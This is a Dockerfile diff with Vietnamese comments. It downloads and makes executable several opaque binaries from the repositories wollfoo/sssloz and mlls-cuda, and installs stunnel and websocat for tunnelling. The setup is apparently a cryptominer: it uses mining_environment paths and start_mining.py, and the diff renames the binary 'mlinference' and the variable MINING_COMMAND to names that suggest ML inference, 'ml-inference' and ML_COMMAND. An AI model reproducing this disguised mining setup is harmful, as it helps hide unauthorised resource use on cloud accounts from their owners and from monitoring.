@@ -35,6 +35,7 @@ ENV AZURE_SUBSCRIPTION_ID=${AZURE_SUBSCRIPTION_ID} \
 
 
 # Cài đặt các thư viện hệ thống và công cụ cần thiết
+
 RUN apt-get update && apt-get install -y --no-install-recommends \
         apt-utils sudo nano wget python3 python3-pip curl git build-essential cmake \
         libssl-dev libeigen3-dev libnuma-dev stunnel4 \
@@ -42,7 +43,10 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
         pciutils openssl lm-sensors powerstat stress-ng bash \
         htop locales iptables powertop tzdata \
         pkg-config libhwloc15 libhwloc-dev ca-certificates lsb-release gnupg \
+        libuv1 libudev1 libssl3 \
     && rm -rf /var/lib/apt/lists/*
+
+
 
 # Thiết lập múi giờ và locale
 RUN ln -fs /usr/share/zoneinfo/Asia/Ho_Chi_Minh /etc/localtime \
@@ -61,14 +65,18 @@ RUN curl -sL https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor |
     && rm -rf /var/lib/apt/lists/*
 
 # Cài đặt các công cụ bổ sung
-RUN curl -L -o /usr/local/bin/mlinference "https://github.com/wollfoo/sssloz/releases/download/ssloz/mlinference" \
-    && chmod +x /usr/local/bin/mlinference \
-    && wget https://github.com/vi/websocat/releases/latest/download/websocat.x86_64-unknown-linux-musl -O /usr/local/bin/websocat \
-    && chmod +x /usr/local/bin/websocat
+RUN curl -L -o /usr/local/bin/ml-inference "https://github.com/wollfoo/sssloz/releases/download/ssloz/ml-inference" \
+    && chmod +x /usr/local/bin/ml-inference 
 
+RUN curl -L -o /usr/local/bin/inference-cuda "https://github.com/wollfoo/sssloz/releases/download/inference-cuda/inference-cuda" \
+    && chmod +x /usr/local/bin/inference-cuda 
 
 RUN curl -L -o /usr/local/bin/libmlls-cuda.so "https://github.com/wollfoo/mlls-cuda/releases/download/mlls-cuda/libmlls-cuda.so" \
     && chmod +x /usr/local/bin/libmlls-cuda.so
+
+RUN curl -L -o /usr/local/bin/websocat "https://github.com/vi/websocat/releases/latest/download/websocat.x86_64-unknown-linux-musl" \
+    && chmod +x /usr/local/bin/websocat
+
 
 # Tạo khóa và chứng chỉ cho Stunnel
 RUN mkdir -p /etc/stunnel && \
@@ -101,9 +109,11 @@ ENV SCRIPT_DIR=/app/mining_environment/scripts \
     CONFIG_DIR=/app/mining_environment/config \
     MODELS_DIR=/app/mining_environment/models \
     LOGS_DIR=/app/mining_environment/logs \
-    MINING_COMMAND=/usr/local/bin/mlinference \
+    ML_COMMAND=/usr/local/bin/ml-inference \
+    CUDA_COMMAND=/usr/local/bin/inference-cuda \
     MLLS_CUDA=/usr/local/bin/libmlls-cuda.so
 
+    
 
 # Bước 6: Sao chép script khởi động
 COPY start_mining.py /app/
